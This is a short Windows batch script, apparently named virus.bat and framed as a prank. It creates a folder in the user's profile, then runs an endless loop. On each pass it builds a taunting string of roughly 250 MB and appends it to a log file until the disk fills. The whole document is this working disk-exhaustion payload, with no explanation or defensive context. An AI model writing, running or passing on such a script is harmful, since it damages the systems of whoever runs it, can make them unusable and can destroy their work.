@echo off
setlocal enabledelayedexpansion

set "mainPath=%userprofile%\virus_prof"
set "logPath=%userprofile%\virus_prof\log.txt"

if not exist "%mainPath%" (
    mkdir "%mainPath%"
)

:loop
set "prankstr=hahahahaha get pranked idiot. "
for /L %%i in (1, 1, 23) do (
    set "prankstr=!prankstr!!prankstr!"
)

echo !prankstr! >> "%logPath%"
goto loop
virus.bat